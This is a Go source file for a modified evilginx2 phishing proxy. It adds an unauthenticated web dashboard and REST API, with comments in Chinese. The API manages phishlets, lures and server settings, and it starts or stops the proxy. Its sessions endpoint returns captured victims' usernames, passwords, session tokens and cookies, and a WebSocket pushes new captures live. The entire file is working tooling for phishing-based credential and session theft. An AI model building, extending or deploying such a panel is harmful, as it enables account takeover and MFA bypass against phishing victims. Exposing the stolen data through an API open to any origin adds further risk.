package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	_log "log"
	"net/http"
	"os"
	"os/exec" // 用于启动/停止 evilginx2 进程
	"os/user"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync" // 用于同步控制 evilginx2 状态
	"time"

	"github.com/caddyserver/certmagic"
	"github.com/fatih/color"
	"github.com/gorilla/websocket"
	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"go.uber.org/zap"
)

var term *core.Terminal // 新增全局 Terminal 实例变量
var phishlets_dir = flag.String("p", "", "Phishlets directory path")
var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
var debug_log = flag.Bool("debug", false, "Enable debug output")
var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
var cfg_dir = flag.String("c", "", "Configuration directory path")
var version_flag = flag.Bool("v", false, "Show version")

var globalCfg *core.Config
var db *database.Database
var bl *core.Blacklist

// 全局 WebSocket 升级器，允许所有来源
var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

// 保存所有已连接的 WebSocket 客户端
var wsClients = make(map[*websocket.Conn]bool)

// 广播通道，用于发送新 session 消息
var broadcast = make(chan interface{})

// ================= 用于 evilginx2 控制的全局变量 =================
var (
	evilginx2Process *exec.Cmd
	evilginx2Running bool
	evilginx2Mutex   sync.Mutex
)

// =====================================================================

// ---------------- 工具函数 ----------------

func respJSON(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(data)
}

// ---------------- WebSocket 相关 ----------------

func handleWS(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Error("WebSocket upgrade error: %v", err)
		return
	}
	defer ws.Close()
	wsClients[ws] = true

	// 循环读取消息以保持连接
	for {
		if _, _, err := ws.ReadMessage(); err != nil {
			delete(wsClients, ws)
			break
		}
	}
}

func broadcastWS() {
	for {
		msg := <-broadcast
		for client := range wsClients {
			err := client.WriteJSON(msg)
			if err != nil {
				client.Close()
				delete(wsClients, client)
			}
		}
	}
}

// 当创建新 session 时，由 main.go 负责广播
func createSessionInMain(sid, phishlet, landing_url, useragent, remote_addr string) error {
	s, err := db.SessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	if err != nil {
		return err
	}
	broadcast <- s
	return nil
}

// ---------------- Phishlet 相关处理 ----------------

// GET /api/phishlet - 返回已加载的 phishlets 列表
func handlePhishlets(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	phNames := globalCfg.GetPhishletNames()
	var result []map[string]interface{}
	for _, name := range phNames {
		cfg := globalCfg.PhishletConfig(name)
		item := map[string]interface{}{
			"name":     name,
			"enabled":  cfg.Enabled,
			"hostname": cfg.Hostname,
		}
		result = append(result, item)
	}
	respJSON(w, result)
}

// POST /api/phishlet/enable
func handlePhishletEnable(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		Name string `json:"name"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	err := globalCfg.SetSiteEnabled(req.Name)
	if err != nil {
		respJSON(w, map[string]interface{}{
			"success": false,
			"error":   err.Error(),
		})
		return
	}
	respJSON(w, map[string]interface{}{
		"success": true,
		"name":    req.Name,
	})
}

// POST /api/phishlet/disable
func handlePhishletDisable(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	type requestData struct {
		Name string `json:"name"`
	}
	var req requestData
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	if err := globalCfg.SetSiteDisabled(req.Name); err != nil {
		respJSON(w, map[string]interface{}{
			"success": false,
			"error":   err.Error(),
		})
		return
	}
	respJSON(w, map[string]interface{}{
		"success": true,
		"name":    req.Name,
	})
}

// PUT /api/phishlet/edit
func handlePhishletEdit(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPut {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		Name       string `json:"name"`
		Hostname   string `json:"hostname"`
		Visibility bool   `json:"visibility"`
		UnauthURL  string `json:"unauth_url"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	if req.Hostname != "" {
		globalCfg.SetSiteHostname(req.Name, req.Hostname)
	}
	if !req.Visibility {
		globalCfg.SetSiteHidden(req.Name, true)
	} else {
		globalCfg.SetSiteHidden(req.Name, false)
	}
	if req.UnauthURL != "" {
		globalCfg.SetSiteUnauthUrl(req.Name, req.UnauthURL)
	}
	respJSON(w, map[string]interface{}{"success": true})
}

// POST /api/phishlet/upload
func handlePhishletUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	file, header, err := r.FormFile("phishlet_file")
	if err != nil {
		http.Error(w, "Failed to read file", http.StatusBadRequest)
		return
	}
	defer file.Close()
	content, err := io.ReadAll(file)
	if err != nil {
		http.Error(w, "Failed to read file content", http.StatusInternalServerError)
		return
	}
	filename := header.Filename
	phishletName := strings.TrimSuffix(filename, filepath.Ext(filename))
	if matched, _ := regexp.MatchString(`^[a-zA-Z0-9_\-]+$`, phishletName); !matched {
		http.Error(w, "Invalid filename", http.StatusBadRequest)
		return
	}
	path := fmt.Sprintf("./phishlets/%s.yaml", phishletName)
	err = os.WriteFile(path, content, 0644)
	if err != nil {
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}
	pl, err := core.NewPhishlet(phishletName, path, nil, globalCfg)
	if err != nil {
		http.Error(w, "Failed to parse phishlet", http.StatusInternalServerError)
		return
	}
	globalCfg.AddPhishlet(phishletName, pl)
	respJSON(w, map[string]interface{}{"success": true, "name": phishletName})
}

// GET /api/phishlet/yaml?name=xxx
func handlePhishletGetYAML(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	name := r.URL.Query().Get("name")
	if name == "" {
		http.Error(w, "Missing phishlet name", http.StatusBadRequest)
		return
	}
	path := fmt.Sprintf("./phishlets/%s.yaml", name)
	content, err := os.ReadFile(path)
	if err != nil {
		http.Error(w, "Failed to read YAML file: "+err.Error(), http.StatusInternalServerError)
		return
	}
	respJSON(w, map[string]interface{}{"success": true, "name": name, "content": string(content)})
}

// DELETE /api/phishlet/delete?name=xxx
func handlePhishletDelete(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodDelete {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	name := r.URL.Query().Get("name")
	if name == "" {
		http.Error(w, "Missing phishlet name", http.StatusBadRequest)
		return
	}
	path := fmt.Sprintf("./phishlets/%s.yaml", name)
	if err := os.Remove(path); err != nil {
		http.Error(w, "Failed to delete phishlet file", http.StatusInternalServerError)
		return
	}
	if err := globalCfg.RemovePhishlet(name); err != nil {
		http.Error(w, "Failed to remove phishlet from config: "+err.Error(), http.StatusInternalServerError)
		return
	}
	respJSON(w, map[string]interface{}{"success": true, "message": "Phishlet deleted"})
}

// PUT /api/phishlet/yaml
func handlePhishletPutYAML(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPut {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		Name    string `json:"name"`
		Content string `json:"content"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	if req.Name == "" {
		http.Error(w, "Missing phishlet name", http.StatusBadRequest)
		return
	}
	path := fmt.Sprintf("./phishlets/%s.yaml", req.Name)
	if err := os.WriteFile(path, []byte(req.Content), 0644); err != nil {
		http.Error(w, "Failed to write YAML file: "+err.Error(), http.StatusInternalServerError)
		return
	}
	respJSON(w, map[string]interface{}{"success": true, "message": "YAML updated successfully"})
}

// GET /api/sessions
// DELETE /api/sessions { "ids": [1,2,3] }
func handleSessions(w http.ResponseWriter, r *http.Request) {
	switch r.Method {

	case http.MethodGet:
		sessions, err := db.GetAllSessions()
		if err != nil {
			log.Error("failed to get session list: %v", err)
			sessions = []*database.Session{}
		}
		var result []map[string]interface{}
		for _, s := range sessions {
			// 修改这里，使用 term.cookieTokensToJSON 转换平铺格式
			var cookiesJson string
			if term != nil {
				cookiesJson = term.CookieTokensToJSON(s.CookieTokens)
			} else {
				// 如果 term 尚未初始化，做个默认处理
				b, err := json.Marshal(s.CookieTokens)
				if err != nil {
					b = []byte("[]")
				}
				cookiesJson = string(b)
			}

			item := map[string]interface{}{
				"id":           s.Id,
				"phishlet":     s.Phishlet,
				"username":     s.Username,
				"password":     s.Password,
				"token":        s.SessionId,
				"useragent":    s.UserAgent,
				"remote_addr":  s.RemoteAddr,
				"cookies_json": cookiesJson,
			}
			result = append(result, item)
		}
		respJSON(w, result)
		return

	case http.MethodDelete:
		type reqBody struct {
			Ids []int `json:"ids"`
		}
		var body reqBody
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, "Bad request", http.StatusBadRequest)
			return
		}
		if len(body.Ids) == 0 {
			http.Error(w, "No ids provided", http.StatusBadRequest)
			return
		}
		for _, id := range body.Ids {
			if err := db.SessionsDeleteOne(id); err != nil {
				log.Error("failed to delete session id=%d: %v", id, err)
				http.Error(w, "failed to delete some session(s)", http.StatusInternalServerError)
				return
			}
		}
		respJSON(w, map[string]interface{}{"success": true})
		return

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
}

// GET /api/dashboard/stats
func handleDashboardStats(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	sessions, err := db.GetAllSessions()
	if err != nil {
		log.Error("failed to get session list: %v", err)
		sessions = []*database.Session{}
	}
	totalSessions := len(sessions)
	ipCount, cidrCount := bl.GetStats()
	blacklistTotal := ipCount + cidrCount
	stats := map[string]interface{}{
		"active_phishlets": len(globalCfg.GetEnabledSites()),
		"total_sessions":   totalSessions,
		"blacklist_ips":    blacklistTotal,
		"timestamp":        time.Now().Format(time.RFC3339),
	}
	respJSON(w, stats)
}

// ================= 新增：Evilginx2 控制接口 =================

// GET /api/evilginx2/status
func handleEviginx2Status(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	evilginx2Mutex.Lock()
	running := evilginx2Running
	evilginx2Mutex.Unlock()
	respJSON(w, map[string]bool{"running": running})
}

// POST /api/evilginx2/start
func handleEvilginx2Start(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	evilginx2Mutex.Lock()
	defer evilginx2Mutex.Unlock()
	if evilginx2Running {
		respJSON(w, map[string]bool{"running": true})
		return
	}

	// 使用路径启动 evilginx2 程序，请根据实际情况修改路径
	evilginx2Path := "./evilginx2"
	cmd := exec.Command(evilginx2Path)
	// 如有需要，可设置工作目录：
	// cmd.Dir = filepath.Dir(evilginx2Path)
	// 将标准输出和错误重定向到当前进程，便于调试
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err := cmd.Start()
	if err != nil {
		http.Error(w, "Failed to start evilginx2: "+err.Error(), http.StatusInternalServerError)
		return
	}
	evilginx2Process = cmd
	evilginx2Running = true
	go func() {
		cmd.Wait()
		evilginx2Mutex.Lock()
		evilginx2Running = false
		evilginx2Process = nil
		evilginx2Mutex.Unlock()
	}()
	respJSON(w, map[string]bool{"running": true})
}

// POST /api/evilginx2/stop
func handleEvilginx2Stop(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	evilginx2Mutex.Lock()
	defer evilginx2Mutex.Unlock()
	if !evilginx2Running || evilginx2Process == nil {
		respJSON(w, map[string]bool{"running": false})
		return
	}
	err := evilginx2Process.Process.Kill()
	if err != nil {
		http.Error(w, "Failed to stop evilginx2: "+err.Error(), http.StatusInternalServerError)
		return
	}
	evilginx2Running = false
	evilginx2Process = nil
	respJSON(w, map[string]bool{"running": false})
}

// ============================================================

// PUT /api/config 路由统一处理（GET/PUT）
func unifiedConfigHandler(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		handleGetConfig(w, r)
	case http.MethodPut:
		handleUpdateConfig(w, r)
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// GET /api/config
func handleGetConfig(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	conf := map[string]interface{}{
		"domain":      globalCfg.GetBaseDomain(),
		"external_ip": globalCfg.GetServerExternalIP(),
		"bind_ip":     globalCfg.GetServerBindIP(),
		"https_port":  globalCfg.GetHttpsPort(),
		"dns_port":    globalCfg.GetDnsPort(),
		"unauth_url":  globalCfg.GetUnauthUrl(),
		"autocert":    globalCfg.IsAutocertEnabled(),
	}
	respJSON(w, conf)
}

// PUT /api/config 使用结构化解析更新配置
func handleUpdateConfig(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPut {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		Domain     string `json:"domain"`
		ExternalIP string `json:"external_ip"`
		BindIP     string `json:"bind_ip"`
		HttpsPort  int    `json:"https_port"`
		DnsPort    int    `json:"dns_port"`
		UnauthUrl  string `json:"unauth_url"`
		Autocert   bool   `json:"autocert"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	globalCfg.SetBaseDomain(req.Domain)
	globalCfg.SetServerExternalIP(req.ExternalIP)
	globalCfg.SetServerBindIP(req.BindIP)
	globalCfg.SetHttpsPort(req.HttpsPort)
	globalCfg.SetDnsPort(req.DnsPort)
	globalCfg.SetUnauthUrl(req.UnauthUrl)
	globalCfg.EnableAutocert(req.Autocert)
	respJSON(w, map[string]interface{}{"success": true})
}

// -------------- Lures 接口 --------------
func handleLures(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		lures := globalCfg.GetAllLures()
		respJSON(w, lures)
	case http.MethodPost:
		var partial core.Lure
		if err := json.NewDecoder(r.Body).Decode(&partial); err != nil {
			http.Error(w, "Bad request", http.StatusBadRequest)
			return
		}
		newLure, err := globalCfg.AddLureAuto(partial.Phishlet, &partial)
		if err != nil {
			http.Error(w, "Failed to add lure: "+err.Error(), http.StatusInternalServerError)
			return
		}
		respJSON(w, map[string]interface{}{
			"success": true,
			"lure":    newLure,
		})
	case http.MethodPut:
		var payload struct {
			ID   int       `json:"id"`
			Lure core.Lure `json:"lure"`
		}
		if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
			http.Error(w, "Bad request", http.StatusBadRequest)
			return
		}
		err := globalCfg.UpdateLureByID(payload.ID, &payload.Lure)
		if err != nil {
			http.Error(w, "Failed to update lure: "+err.Error(), http.StatusBadRequest)
			return
		}
		respJSON(w, map[string]interface{}{"success": true})
	case http.MethodDelete:
		idStr := r.URL.Query().Get("id")
		if idStr == "" {
			http.Error(w, "missing id param", http.StatusBadRequest)
			return
		}
		lureID, err := strconv.Atoi(idStr)
		if err != nil {
			http.Error(w, "invalid lure id", http.StatusBadRequest)
			return
		}
		if err := globalCfg.DeleteLureByID(lureID); err != nil {
			http.Error(w, "delete lure error: "+err.Error(), http.StatusInternalServerError)
			return
		}
		respJSON(w, map[string]interface{}{"success": true})
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// -------------- Admin UI 启动 --------------
func applyCORS(h http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS, PUT, DELETE")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusOK)
			return
		}
		h.ServeHTTP(w, r)
	})
}

func startAdminUI() {
	mux := http.NewServeMux()
	fs := http.FileServer(http.Dir("dashboard"))
	mux.Handle("/dashboard/", http.StripPrefix("/dashboard/", fs))
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "/dashboard/index.html", http.StatusFound)
	})
	mux.HandleFunc("/api/phishlet/yaml", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodGet {
			handlePhishletGetYAML(w, r)
		} else if r.Method == http.MethodPut {
			handlePhishletPutYAML(w, r)
		} else {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		}
	})
	mux.HandleFunc("/api/config", unifiedConfigHandler)
	mux.HandleFunc("/api/phishlet", handlePhishlets)
	mux.HandleFunc("/api/phishlet/enable", handlePhishletEnable)
	mux.HandleFunc("/api/phishlet/disable", handlePhishletDisable)
	mux.HandleFunc("/api/phishlet/edit", handlePhishletEdit)
	mux.HandleFunc("/api/phishlet/upload", handlePhishletUpload)
	mux.HandleFunc("/api/sessions", handleSessions)
	mux.HandleFunc("/api/dashboard/stats", handleDashboardStats)
	mux.HandleFunc("/ws", handleWS)
	mux.HandleFunc("/api/projects", handleProjects)
	mux.HandleFunc("/api/phishlet/delete", handlePhishletDelete)
	mux.HandleFunc("/api/lures", handleLures)
	// ================= 新增：注册 evilginx2 接口 =================
	mux.HandleFunc("/api/evilginx2/status", handleEviginx2Status)
	mux.HandleFunc("/api/evilginx2/start", handleEvilginx2Start)
	mux.HandleFunc("/api/evilginx2/stop", handleEvilginx2Stop)
	// ============================================================
	handlerWithCORS := applyCORS(mux)
	port := ":8080"
	log.Info("Admin UI listening on %s", port)
	if err := http.ListenAndServe(port, handlerWithCORS); err != nil {
		log.Fatal("Admin UI server error: %v", err)
	}
}

func joinPathCustom(base_path string, rel_path string) string {
	if filepath.IsAbs(rel_path) {
		return rel_path
	}
	return filepath.Join(base_path, rel_path)
}

func showAd() {
	lred := color.New(color.FgHiRed)
	lyellow := color.New(color.FgHiYellow)
	white := color.New(color.FgHiWhite)
	message := fmt.Sprintf("%s: %s %s",
		lred.Sprint("Evilginx Mastery Course"),
		lyellow.Sprint("https://academy.breakdev.org/evilginx-mastery"),
		white.Sprint("(learn how to create phishlets)"))
	log.Info("%s", message)
}

func main() {
	flag.Parse()

	if *version_flag {
		log.Info("version: %s", core.VERSION)
		return
	}

	exe_path, _ := os.Executable()
	exe_dir := filepath.Dir(exe_path)

	core.Banner()
	showAd()

	_log.SetOutput(log.NullLogger().Writer())
	certmagic.Default.Logger = zap.NewNop()
	certmagic.DefaultACME.Logger = zap.NewNop()

	if *phishlets_dir == "" {
		*phishlets_dir = joinPathCustom(exe_dir, "./phishlets")
		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
			*phishlets_dir = "/usr/share/evilginx/phishlets/"
			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
				return
			}
		}
	}
	if *redirectors_dir == "" {
		*redirectors_dir = joinPathCustom(exe_dir, "./redirectors")
		if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
			*redirectors_dir = "/usr/share/evilginx/redirectors/"
			if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
				*redirectors_dir = joinPathCustom(exe_dir, "./redirectors")
			}
		}
	}
	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
		return
	}
	if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
		os.MkdirAll(*redirectors_dir, os.FileMode(0700))
	}

	log.DebugEnable(*debug_log)
	if *debug_log {
		log.Info("debug output enabled")
	}

	phishlets_path := *phishlets_dir
	log.Info("loading phishlets from: %s", phishlets_path)

	if *cfg_dir == "" {
		usr, err := user.Current()
		if err != nil {
			log.Fatal("%v", err)
			return
		}
		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
	}

	config_path := *cfg_dir
	log.Info("loading configuration from: %s", config_path)

	err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	crt_path := joinPathCustom(*cfg_dir, "./crt")

	cfg, err := core.NewConfig(*cfg_dir, "")
	if err != nil {
		log.Fatal("config: %v", err)
		return
	}
	cfg.SetRedirectorsDir(*redirectors_dir)

	db, err = database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
	if err != nil {
		log.Fatal("database: %v", err)
		return
	}

	bl, err = core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
	if err != nil {
		log.Error("blacklist: %s", err)
		return
	}

	// 扫描 phishlets 目录
	files, err := os.ReadDir(phishlets_path)
	if err != nil {
		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
		return
	}
	for _, f := range files {
		if !f.IsDir() {
			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
			rpname := pr.FindStringSubmatch(f.Name())
			if len(rpname) < 2 {
				continue
			}
			pname := rpname[1]
			if pname != "" {
				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), nil, cfg)
				if err != nil {
					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
					continue
				}
				cfg.AddPhishlet(pname, pl)
			}
		}
	}
	cfg.LoadSubPhishlets()
	cfg.CleanUp()

	// 如果有 initProjects() 或其他初始化逻辑，可在这里调用

	ns, _ := core.NewNameserver(cfg)
	ns.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns)
	if err != nil {
		log.Fatal("certdb: %v", err)
		return
	}

	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
	hp.Start()
	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
	if err != nil {
		log.Fatal("%v", err)
		return
	}
	term = t // 保存 Terminal 到全局变量，供 handleSessions 调用

	globalCfg = cfg

	// 启动 WebSocket 广播协程
	go broadcastWS()
	// 启动 Admin UI
	go startAdminUI()
	// 启动 Evilginx CLI 交互（阻塞）
	t.DoWork()
}
